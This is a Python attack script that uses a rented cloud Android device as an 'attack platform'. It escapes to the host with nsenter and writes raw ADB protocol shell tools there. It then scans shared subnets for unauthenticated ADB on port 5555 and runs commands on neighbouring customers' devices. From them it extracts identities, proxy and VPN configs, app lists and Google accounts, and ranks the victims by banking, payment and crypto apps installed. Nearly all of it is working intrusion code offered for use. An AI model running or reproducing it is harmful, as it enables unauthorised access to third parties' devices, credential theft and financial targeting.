#!/usr/bin/env python3
"""
Mass Neighbor Reconnaissance & Proxy Extraction
================================================
Uses ATP6416I3JJRXL3V (Samsung S25 Ultra @ 10.10.53.148) as attack platform.
Exploits nsenter host escape + no-auth ADB on TCP 5555 to:
1. Map ALL containers on the physical host via mount/dm/loop analysis
2. Scan /16 network for ADB-responding neighbors
3. Execute shell commands on neighbors via raw ADB protocol
4. Extract proxy configs, app lists, device identities
5. Rank targets by value
"""

import asyncio
import json
import os
import re
import sys
import time
from datetime import datetime, timezone
from collections import defaultdict

sys.path.insert(0, os.path.dirname(__file__))
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

AK = "YOUR_VMOS_AK_HERE"
SK = "YOUR_VMOS_SK_HERE"
BASE = "https://api.vmoscloud.com"
PAD = "ATP6416I3JJRXL3V"  # Primary attack platform (S25 Ultra)
DELAY = 3.5  # Rate limit spacing


async def sh(client, cmd, timeout=30, label=""):
    """Execute shell on our device, return stdout."""
    await asyncio.sleep(DELAY)
    try:
        resp = await client.sync_cmd(pad_code=PAD, command=cmd, timeout_sec=timeout)
        data = resp.get("data", {})
        if isinstance(data, list) and data:
            entry = data[0]
            if isinstance(entry, dict):
                return (entry.get("errorMsg", "") or "").strip()
            return str(entry).strip()
        elif isinstance(data, dict):
            return (data.get("errorMsg", data.get("result", "")) or "").strip()
        return str(data).strip()
    except Exception as e:
        if label:
            print(f"  [{label}] ERROR: {e}")
        return f"ERROR: {e}"


async def nsh(client, cmd, timeout=30, label=""):
    """Execute on HOST via nsenter (escape container)."""
    escaped = cmd.replace("'", "'\\''")
    return await sh(client, f"nsenter -t 1 -m -u -i -n -p -- sh -c '{escaped}'", timeout, label)


# ═══════════════════════════════════════════════════════════════════════
# PHASE 1: Write ADB client helper to device
# ═══════════════════════════════════════════════════════════════════════
ADB_CLIENT_SCRIPT = r'''#!/system/bin/sh
# Minimal ADB TCP client using toybox/busybox
# Usage: adb_client.sh <IP> <PORT> <COMMAND>
# Sends CNXN + OPEN(shell:<cmd>), reads response

HOST="$1"
PORT="$2"
CMD="$3"
TIMEOUT="${4:-3}"

# Create CNXN packet (24 header + "host::\0" payload)
# CNXN 0x01000001 0x00040000 7 checksum "host::\0"
CNXN_HDR=$(printf '\x43\x4e\x58\x4e\x01\x00\x00\x01\x00\x00\x04\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1')
CNXN_PAY=$(printf 'host::\0')

# Build OPEN packet for shell command
SHELL_STR="shell:${CMD}"
SHELL_LEN=${#SHELL_STR}
# Add null terminator
SHELL_LEN=$((SHELL_LEN + 1))

# Pack OPEN header: cmd=OPEN(0x4e45504f), arg0=1, arg1=0, data_length, data_crc, magic
# Calculate simple checksum
CKSUM=0
for i in $(seq 0 $((${#SHELL_STR} - 1))); do
    c=$(printf '%d' "'$(echo "$SHELL_STR" | cut -c$((i+1)))")
    CKSUM=$((CKSUM + c))
done

# Use exec with /dev/tcp if available, otherwise nc
TMPDIR="/data/local/tmp"
OUTFILE="$TMPDIR/adb_out_$$"
INFILE="$TMPDIR/adb_in_$$"

# Build complete send buffer: CNXN + payload + OPEN + payload
{
    printf '\x43\x4e\x58\x4e'  # CNXN
    printf '\x01\x00\x00\x01'  # version
    printf '\x00\x00\x04\x00'  # maxdata 256KB
    printf '\x07\x00\x00\x00'  # data_length=7
    printf '\x32\x02\x00\x00'  # data_crc
    printf '\xbc\xb1\xa7\xb1'  # magic
    printf 'host::\0'          # CNXN payload

    # Small delay equivalent - padding
    printf '\x4f\x50\x45\x4e'  # OPEN
    printf '\x01\x00\x00\x00'  # local_id=1
    printf '\x00\x00\x00\x00'  # remote_id=0

    # data_length (little-endian 32bit)
    printf "\\x$(printf '%02x' $((SHELL_LEN & 0xFF)))"
    printf "\\x$(printf '%02x' $(((SHELL_LEN >> 8) & 0xFF)))"
    printf '\x00\x00'

    # checksum (little-endian 32bit)
    printf "\\x$(printf '%02x' $((CKSUM & 0xFF)))"
    printf "\\x$(printf '%02x' $(((CKSUM >> 8) & 0xFF)))"
    printf "\\x$(printf '%02x' $(((CKSUM >> 16) & 0xFF)))"
    printf "\\x$(printf '%02x' $(((CKSUM >> 24) & 0xFF)))"

    # magic (OPEN ^ 0xFFFFFFFF = 0xb0a1b0ff)
    printf '\xff\xb0\xa1\xb0'

    # OPEN payload
    printf '%s\0' "$SHELL_STR"
} > "$INFILE" 2>/dev/null

# Send and capture response (timeout-based)
cat "$INFILE" | nc -w "$TIMEOUT" "$HOST" "$PORT" > "$OUTFILE" 2>/dev/null

# Extract WRTE payload from response
# Response format: [CNXN 24B + payload][OKAY 24B][WRTE 24B + data]...
# Find WRTE markers and extract data between them
if [ -s "$OUTFILE" ]; then
    # Skip binary headers, extract printable text
    strings "$OUTFILE" 2>/dev/null | grep -v '^host::$' | grep -v '^device::' | head -100
fi

# Cleanup
rm -f "$INFILE" "$OUTFILE" 2>/dev/null
'''


async def phase1_deploy_tools(client):
    """Deploy ADB client script and scanning tools to the device."""
    print("\n" + "=" * 80)
    print("  PHASE 1: Deploy Tools to Attack Platform")
    print("=" * 80)

    # Write the ADB client script to host filesystem
    script_b64 = ADB_CLIENT_SCRIPT.replace("'", "'\\''")
    
    # Write smaller, more reliable scanner directly
    print("\n  [1a] Writing ADB scanner to host /data/local/tmp...")
    
    # First verify nsenter works
    whoami = await nsh(client, "id", label="nsenter-test")
    print(f"       Host identity: {whoami}")
    
    # Write the scanner script in chunks via echo
    scanner = r'''#!/system/bin/sh
# Quick ADB probe: sends CNXN, checks for response
# Usage: probe.sh <ip> [timeout_sec]
IP="$1"; TO="${2:-2}"
# CNXN packet bytes
printf '\x43\x4e\x58\x4e\x01\x00\x00\x01\x00\x00\x04\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00' | nc -w "$TO" "$IP" 5555 2>/dev/null | head -c 100 | strings
'''
    
    # Write probe script
    await nsh(client, 
        '''cat > /data/local/tmp/probe.sh << 'PROBEEOF'
#!/system/bin/sh
IP="$1"; TO="${2:-2}"
printf '\\x43\\x4e\\x58\\x4e\\x01\\x00\\x00\\x01\\x00\\x00\\x04\\x00\\x07\\x00\\x00\\x00\\x32\\x02\\x00\\x00\\xbc\\xb1\\xa7\\xb1host::\\x00' | nc -w "$TO" "$IP" 5555 2>/dev/null | head -c 200 | strings
PROBEEOF
chmod 755 /data/local/tmp/probe.sh''',
        label="write-probe")
    
    # Write ADB shell executor script
    print("  [1b] Writing ADB shell executor to host...")
    await nsh(client,
        r'''cat > /data/local/tmp/adb_exec.sh << 'EXECEOF'
#!/system/bin/sh
# ADB shell command executor via raw protocol
# Usage: adb_exec.sh <ip> <command> [timeout]
IP="$1"; CMD="$2"; TO="${3:-5}"
TMP="/data/local/tmp/adb_$$"

# Build CNXN + OPEN(shell:cmd) packet
SCMD="shell:${CMD}"
SLEN=$((${#SCMD} + 1))

# Calculate payload checksum
CKSUM=0
i=0; while [ $i -lt ${#SCMD} ]; do
  CH=$(printf '%s' "$SCMD" | dd bs=1 skip=$i count=1 2>/dev/null)
  if [ -n "$CH" ]; then
    CKSUM=$((CKSUM + $(printf '%d' "'$CH")))
  fi
  i=$((i + 1))
done

{
  # CNXN header + payload
  printf '\x43\x4e\x58\x4e\x01\x00\x00\x01\x00\x00\x04\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1'
  printf 'host::\x00'
  # OPEN header
  printf '\x4f\x50\x45\x4e\x01\x00\x00\x00\x00\x00\x00\x00'
  # data_length LE32
  printf "\\x$(printf '%02x' $((SLEN & 255)))\\x$(printf '%02x' $(((SLEN>>8) & 255)))\\x00\\x00"
  # checksum LE32
  printf "\\x$(printf '%02x' $((CKSUM & 255)))\\x$(printf '%02x' $(((CKSUM>>8) & 255)))\\x$(printf '%02x' $(((CKSUM>>16) & 255)))\\x$(printf '%02x' $(((CKSUM>>24) & 255)))"
  # magic (OPEN ^ 0xFFFFFFFF)
  printf '\xff\xb0\xa1\xb0'
  # OPEN payload
  printf '%s\x00' "$SCMD"
} > "${TMP}_send" 2>/dev/null

cat "${TMP}_send" | nc -w "$TO" "$IP" 5555 > "${TMP}_recv" 2>/dev/null

# Extract text from WRTE packets - skip headers, get printable content
if [ -s "${TMP}_recv" ]; then
  # Use dd to skip CNXN response (24+var) and extract WRTE payloads
  SIZE=$(wc -c < "${TMP}_recv")
  if [ "$SIZE" -gt 48 ]; then
    strings "${TMP}_recv" | grep -v '^host::$' | grep -v '^device::' | grep -v '^shell,' | head -200
  fi
fi
rm -f "${TMP}_send" "${TMP}_recv" 2>/dev/null
EXECEOF
chmod 755 /data/local/tmp/adb_exec.sh''',
        label="write-exec")
    
    # Write subnet scanner
    print("  [1c] Writing parallel subnet scanner...")
    await nsh(client,
        r'''cat > /data/local/tmp/scan_subnet.sh << 'SCANEOF'
#!/system/bin/sh
# Parallel ADB subnet scanner
# Usage: scan_subnet.sh <base_ip> <start> <end>
BASE="$1"; START="${2:-1}"; END="${3:-254}"
FOUND=""
i=$START
while [ $i -le $END ]; do
  IP="${BASE}.${i}"
  (printf '\x43\x4e\x58\x4e\x01\x00\x00\x01\x00\x00\x04\x00\x07\x00\x00\x00\x32\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00' | nc -w 1 "$IP" 5555 2>/dev/null | head -c 4 | grep -q "CNXN" && echo "ADB:${IP}") &
  # Run 20 in parallel
  if [ $((i % 20)) -eq 0 ]; then wait; fi
  i=$((i + 1))
done
wait
SCANEOF
chmod 755 /data/local/tmp/scan_subnet.sh''',
        label="write-scanner")
    
    print("  [OK] All tools deployed to /data/local/tmp/")
    return True


async def phase2_map_host_containers(client):
    """Map all containers on this physical host."""
    print("\n" + "=" * 80)
    print("  PHASE 2: Map Host Containers & Mount Points")
    print("=" * 80)

    # Get all mount points
    print("\n  [2a] Enumerating host mount points...")
    mounts = await nsh(client, "cat /proc/mounts | grep -E 'ext4|f2fs|fuse' | head -60", label="mounts")
    print(f"       Mounts found:\n{mounts[:2000]}")

    # Get all loop devices
    print("\n  [2b] Loop device mapping...")
    loops = await nsh(client, "ls -la /dev/block/loop* 2>/dev/null | head -40; echo ---; losetup -a 2>/dev/null | head -60", label="loops")
    print(f"       Loops:\n{loops[:2000]}")

    # Get dm device mapping
    print("\n  [2c] Device-mapper topology...")
    dm_info = await nsh(client, "ls -la /dev/block/dm-* 2>/dev/null | head -40; echo ---; dmsetup table 2>/dev/null | head -40", label="dm")
    print(f"       DM info:\n{dm_info[:2000]}")

    # List all VMs/containers managed by xu_daemon
    print("\n  [2d] xu_daemon managed containers...")
    xu_info = await nsh(client, "ls -la /data/local/oicq/ 2>/dev/null; echo ---; ls -la /data/local/oicq/*/conf/ 2>/dev/null | head -40", label="xu-info")
    print(f"       xu_daemon data:\n{xu_info[:2000]}")

    # Check cgroup hierarchy for containers
    print("\n  [2e] Cgroup container hierarchy...")
    cgroups = await nsh(client, "ls /sys/fs/cgroup/uid_*/ 2>/dev/null | head -20; echo ---; cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null", label="cgroups")
    print(f"       Cgroups:\n{cgroups[:1000]}")

    # Process list showing all containers
    print("\n  [2f] All container init processes (PID namespace roots)...")
    inits = await nsh(client, "ps -A -o pid,ppid,user,name | grep -E 'init|zygote|system_server' | head -30", label="inits")
    print(f"       Container processes:\n{inits[:1500]}")

    return mounts


async def phase3_scan_local_subnet(client):
    """Scan local /24 subnet for ADB neighbors."""
    print("\n" + "=" * 80)
    print("  PHASE 3: ADB Neighbor Discovery (Local /24)")
    print("=" * 80)

    # Run the parallel scanner on 10.10.53.0/24
    print("\n  [3a] Scanning 10.10.53.0/24 for ADB (port 5555)...")
    result = await nsh(client, 
        "sh /data/local/tmp/scan_subnet.sh 10.10.53 1 254",
        timeout=60, label="scan-53")
    
    neighbors_53 = []
    for line in result.split("\n"):
        if line.startswith("ADB:"):
            ip = line.split(":")[1].strip()
            neighbors_53.append(ip)
    
    print(f"       Found {len(neighbors_53)} ADB hosts in 10.10.53.0/24")
    for ip in sorted(neighbors_53):
        print(f"         {ip}")

    return neighbors_53


async def phase4_scan_broad_network(client):
    """Scan broader /16 network - sample key subnets."""
    print("\n" + "=" * 80)
    print("  PHASE 4: Broad Network Scan (/16 Sampling)")
    print("=" * 80)

    # From ARP table we know subnets: 1,2,11,27,41,45,53,74,80
    # Sample more subnets for comprehensive mapping
    known_subnets = [1, 2, 11, 27, 41, 45, 53, 74, 80]
    all_neighbors = {}
    
    # Also sample random subnets to find more
    sample_subnets = list(range(1, 120, 3))  # Sample every 3rd subnet 1-120
    scan_subnets = sorted(set(known_subnets + sample_subnets))

    print(f"\n  Scanning {len(scan_subnets)} subnets for ADB hosts...")
    
    for subnet in scan_subnets:
        base = f"10.10.{subnet}"
        # Quick parallel scan - check .50-.160 range (typical container IP range)
        result = await nsh(client,
            f"sh /data/local/tmp/scan_subnet.sh {base} 40 170",
            timeout=45, label=f"scan-{subnet}")
        
        found = []
        for line in result.split("\n"):
            if line.startswith("ADB:"):
                ip = line.split(":")[1].strip()
                found.append(ip)
        
        if found:
            all_neighbors[subnet] = found
            print(f"    10.10.{subnet}.0/24: {len(found)} ADB hosts — {', '.join(found[:5])}{'...' if len(found) > 5 else ''}")
        
    total = sum(len(v) for v in all_neighbors.values())
    print(f"\n  [TOTAL] {total} ADB hosts across {len(all_neighbors)} subnets")
    
    return all_neighbors


async def phase5_extract_neighbor_data(client, neighbors):
    """Execute commands on each neighbor to extract device info, proxies, apps."""
    print("\n" + "=" * 80)
    print("  PHASE 5: Neighbor Data Extraction")
    print("=" * 80)

    results = {}
    
    # Flatten neighbor list
    all_ips = []
    for subnet_ips in neighbors.values():
        all_ips.extend(subnet_ips)
    
    # Skip our own IP
    all_ips = [ip for ip in all_ips if ip != "10.10.53.148"]
    
    print(f"\n  Extracting data from {len(all_ips)} neighbors...")

    for i, ip in enumerate(all_ips):
        print(f"\n  [{i+1}/{len(all_ips)}] {ip}")
        device_data = {"ip": ip}
        
        # 1. Device identity (build.prop)
        identity = await nsh(client,
            f"sh /data/local/tmp/adb_exec.sh {ip} 'getprop ro.product.model; getprop ro.product.brand; getprop ro.product.device; getprop ro.build.fingerprint; getprop ro.serialno; getprop ro.build.version.release' 4",
            timeout=15, label=f"{ip}-identity")
        device_data["identity"] = identity
        
        # 2. Proxy configuration
        proxy = await nsh(client,
            f"sh /data/local/tmp/adb_exec.sh {ip} 'settings get global http_proxy 2>/dev/null; echo PROXY_SEP; cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | grep -i proxy | head -10; echo PROXY_SEP; iptables -t nat -L -n 2>/dev/null | head -20; echo PROXY_SEP; getprop persist.sys.http_proxy; echo PROXY_SEP; cat /data/local/oicq/*/conf/*.toml 2>/dev/null | grep -iE \"proxy|socks|port|addr\" | head -10' 8",
            timeout=20, label=f"{ip}-proxy")
        device_data["proxy"] = proxy
        
        # 3. Running apps / packages
        apps = await nsh(client,
            f"sh /data/local/tmp/adb_exec.sh {ip} 'pm list packages -3 2>/dev/null | head -80' 6",
            timeout=18, label=f"{ip}-apps")
        device_data["apps"] = apps
        
        # 4. Smart IP / VPN status
        network = await nsh(client,
            f"sh /data/local/tmp/adb_exec.sh {ip} 'ip addr show 2>/dev/null | grep inet | head -10; echo NET_SEP; ip route show 2>/dev/null | head -5; echo NET_SEP; cat /proc/net/tcp 2>/dev/null | head -20' 6",
            timeout=18, label=f"{ip}-network")
        device_data["network"] = network
        
        # 5. OwlProxy / SagerNet configs
        vpn_conf = await nsh(client,
            f"sh /data/local/tmp/adb_exec.sh {ip} 'ls /data/data/com.owlproxy.overseas/ 2>/dev/null; cat /data/data/com.owlproxy.overseas/shared_prefs/*.xml 2>/dev/null | head -50; echo VPN_SEP; ls /data/data/io.nekohasekai.sagernet/ 2>/dev/null; cat /data/data/io.nekohasekai.sagernet/shared_prefs/*.xml 2>/dev/null | head -50' 6",
            timeout=18, label=f"{ip}-vpn")
        device_data["vpn_config"] = vpn_conf
        
        # 6. Google accounts
        accounts = await nsh(client,
            f"sh /data/local/tmp/adb_exec.sh {ip} 'dumpsys account 2>/dev/null | grep -E \"Account|name=|type=\" | head -20' 5",
            timeout=15, label=f"{ip}-accounts")
        device_data["accounts"] = accounts
        
        results[ip] = device_data
        
        # Print summary
        model = "unknown"
        if identity and "ERROR" not in identity:
            lines = [l.strip() for l in identity.split("\n") if l.strip()]
            if lines:
                model = lines[0]
        
        app_count = 0
        if apps and "ERROR" not in apps:
            app_count = len([l for l in apps.split("\n") if "package:" in l])
        
        has_proxy = "YES" if (proxy and ":" in proxy and "null" not in proxy.lower() and "PROXY_SEP" not in proxy) else "check"
        
        print(f"       Model: {model} | Apps: {app_count} | Proxy: {has_proxy}")

    return results


def analyze_and_rank(results):
    """Analyze extracted data and rank devices by value."""
    print("\n" + "=" * 80)
    print("  PHASE 6: Target Analysis & Ranking")
    print("=" * 80)
    
    HIGH_VALUE_APPS = {
        "com.google.android.apps.walletnfcrel": "Google Pay",
        "com.paypal.android.p2pmobile": "PayPal",
        "com.venmo": "Venmo",
        "com.squareup.cash": "Cash App",
        "com.chime.chmob": "Chime",
        "com.transferwise.android": "Wise",
        "com.revolut.revolut": "Revolut",
        "com.coinbase.android": "Coinbase",
        "com.binance.dev": "Binance",
        "com.bybit.app": "Bybit",
        "com.robinhood.android": "Robinhood",
        "com.zellepay.zelle": "Zelle",
        "com.wf.wellsfargomobile": "Wells Fargo",
        "com.chase.sig.android": "Chase",
        "com.bankofamerica.cashpromobile": "Bank of America",
        "com.citi.citimobile": "Citi",
        "com.usaa.mobile.android.usaa": "USAA",
        "com.capitalone.mobile": "Capital One",
        "com.americanexpress.android.acctsvcs.us": "Amex",
        "com.discover.mobile": "Discover",
        "com.sofi.mobile": "SoFi",
        "com.affirm.customer": "Affirm",
        "com.klarna.android": "Klarna",
        "com.afterpay.afterpay": "Afterpay",
        "com.stripe.android.dashboard": "Stripe",
        "com.shopify.mobile": "Shopify",
        "com.samsung.android.spay": "Samsung Pay",
        "com.apple.android.music": "Apple Music",
        "com.amazon.mShop.android.shopping": "Amazon",
    }
    
    ranked = []
    proxy_list = []
    
    for ip, data in results.items():
        score = 0
        found_apps = []
        proxy_info = None
        
        # Score based on apps
        if data.get("apps"):
            for pkg, name in HIGH_VALUE_APPS.items():
                if pkg in data["apps"]:
                    found_apps.append(name)
                    score += 10
        
        # Score based on accounts
        if data.get("accounts") and "Account" in data.get("accounts", ""):
            acc_count = data["accounts"].count("Account")
            score += acc_count * 5
        
        # Parse proxy info
        proxy_raw = data.get("proxy", "")
        if proxy_raw and ":" in proxy_raw:
            for line in proxy_raw.split("\n"):
                line = line.strip()
                if line and "PROXY_SEP" not in line and "null" not in line.lower() and ":" in line:
                    # Looks like proxy config
                    if any(c.isdigit() for c in line):
                        proxy_info = line
                        score += 15
                        break
        
        # Parse VPN/OwlProxy config
        vpn_raw = data.get("vpn_config", "")
        if vpn_raw and "VPN_SEP" not in vpn_raw.strip():
            if any(kw in vpn_raw.lower() for kw in ["server", "port", "host", "proxy", "socks"]):
                score += 20
                if not proxy_info:
                    proxy_info = vpn_raw[:200]
        
        # Extract model
        identity = data.get("identity", "")
        model = "Unknown"
        brand = ""
        if identity:
            lines = [l.strip() for l in identity.split("\n") if l.strip()]
            if len(lines) >= 2:
                model = lines[0]
                brand = lines[1]
        
        ranked.append({
            "ip": ip,
            "model": model,
            "brand": brand,
            "score": score,
            "high_value_apps": found_apps,
            "proxy": proxy_info,
            "identity_raw": identity,
            "app_count": len([l for l in data.get("apps", "").split("\n") if "package:" in l]),
        })
        
        if proxy_info:
            proxy_list.append({
                "ip": ip,
                "model": model,
                "proxy": proxy_info,
                "vpn_raw": vpn_raw[:500] if vpn_raw else None,
            })
    
    # Sort by score descending
    ranked.sort(key=lambda x: x["score"], reverse=True)
    
    # Print rankings
    print(f"\n  {'='*78}")
    print(f"  {'Rank':<5} {'IP':<18} {'Model':<20} {'Score':<7} {'Apps':<6} {'High-Value'}")
    print(f"  {'='*78}")
    
    for i, dev in enumerate(ranked[:50], 1):
        hv = ", ".join(dev["high_value_apps"][:3]) if dev["high_value_apps"] else "-"
        px = " [PROXY]" if dev["proxy"] else ""
        print(f"  {i:<5} {dev['ip']:<18} {dev['model'][:19]:<20} {dev['score']:<7} {dev['app_count']:<6} {hv}{px}")
    
    print(f"\n  {'='*78}")
    print(f"\n  PROXY ENDPOINTS FOUND ({len(proxy_list)}):")
    print(f"  {'-'*78}")
    for p in proxy_list:
        print(f"    {p['ip']:<18} {p['model']:<20} proxy={p['proxy']}")
    
    return ranked, proxy_list


async def main():
    print("=" * 80)
    print("  MASS NEIGHBOR RECONNAISSANCE & PROXY EXTRACTION")
    print(f"  Attack Platform: {PAD} (Samsung S25 Ultra @ 10.10.53.148)")
    print(f"  Started: {datetime.now().isoformat()}")
    print("=" * 80)

    client = VMOSCloudClient(ak=AK, sk=SK, base_url=BASE)

    # Phase 1: Deploy tools
    await phase1_deploy_tools(client)

    # Phase 2: Map host containers
    await phase2_map_host_containers(client)

    # Phase 3: Scan local /24
    local_neighbors = await phase3_scan_local_subnet(client)

    # Phase 4: Scan broader network (sample subnets)
    # Start with just key known subnets to save time
    print("\n  [Scanning known active subnets from ARP table...]")
    all_neighbors = {}
    
    known_subnets = [1, 2, 11, 27, 41, 45, 74, 80]
    for subnet in known_subnets:
        base = f"10.10.{subnet}"
        result = await nsh(client,
            f"sh /data/local/tmp/scan_subnet.sh {base} 40 170",
            timeout=45, label=f"scan-{subnet}")
        
        found = []
        for line in result.split("\n"):
            if line.startswith("ADB:"):
                ip = line.split(":")[1].strip()
                found.append(ip)
        
        if found:
            all_neighbors[subnet] = found
            print(f"    10.10.{subnet}.0/24: {len(found)} ADB hosts")

    # Merge local scan results
    if local_neighbors:
        all_neighbors[53] = local_neighbors
    
    total = sum(len(v) for v in all_neighbors.values())
    print(f"\n  [TOTAL SCAN] {total} ADB-responding hosts across {len(all_neighbors)} subnets")
    
    # Phase 5: Extract data from first batch of neighbors
    # Start with local subnet (fastest, most reliable)
    results = await phase5_extract_neighbor_data(client, all_neighbors)
    
    # Phase 6: Analyze and rank
    ranked, proxies = analyze_and_rank(results)
    
    # Save results
    output = {
        "timestamp": datetime.now().isoformat(),
        "attack_platform": PAD,
        "total_neighbors_found": total,
        "subnets_scanned": list(all_neighbors.keys()),
        "neighbor_ips": {str(k): v for k, v in all_neighbors.items()},
        "device_data": {ip: {k: v[:500] if isinstance(v, str) and len(v) > 500 else v 
                             for k, v in data.items()} 
                       for ip, data in results.items()},
        "ranked_targets": ranked[:50],
        "proxy_endpoints": proxies,
    }
    
    outfile = "neighbor_recon_report.json"
    with open(outfile, "w") as f:
        json.dump(output, f, indent=2, default=str)
    print(f"\n  [SAVED] Full report → {outfile}")
    
    print(f"\n{'='*80}")
    print(f"  RECON COMPLETE")
    print(f"  Total neighbors: {total}")
    print(f"  Data extracted: {len(results)}")
    print(f"  Proxies found: {len(proxies)}")
    print(f"  High-value targets: {len([r for r in ranked if r['score'] >= 20])}")
    print(f"{'='*80}")


if __name__ == "__main__":
    asyncio.run(main())
